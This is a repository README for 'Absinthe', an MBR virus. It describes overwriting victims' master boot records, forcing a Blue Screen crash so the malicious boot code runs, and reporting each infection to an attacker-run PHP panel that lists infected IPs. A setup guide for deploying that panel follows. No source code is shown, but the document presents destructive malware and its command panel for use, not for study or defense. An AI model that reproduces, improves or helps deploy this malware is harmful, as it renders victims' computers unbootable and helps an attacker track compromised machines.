# Absinthe

MBR virus, with infect count panel. 

### 1/7/2021

It's been a little under a year since I made this repo. I had known the whole "overwrite the MBR with 512 bytes of 0" trick for a while, but it's kinda lame to just brick the computer. 

So I did more research... and found some code to overwrite it with a custom message. But that wasn't enough. 

Originally, you ran the program, it wrote our own code to the master boot record, and the user had to restart for it to take affect. That's lame.
so I added these features

1. Forced reboot via BSoD (force a Blue Screen of Death forcing the computer to crash and restart, automatically running our code that shows the message)
2. Sends an HTTP GET request to our panel, to log a successful infect. 
3. Panel, for viewing the infect count, and IPs of the infected bots. 

There are also instructions in the main cpp file for how to set it up. It isn't hard.

## Panel setup guide

First setup a web server with PHP. I use apache. I have not tested with nginx, or XAMPP.  

then move the panel files to the root folder of your web server (with apache it's /var/www/html/ by default)

create a new file called "visitors.txt" in the same directory as the panel files and make sure to leave it empty. You can do this on linux with the command `touch visitors.txt`

finally, run the command `chmod 777 *` in the folder with the panel files. 

then, open a browser and type your server's IP.
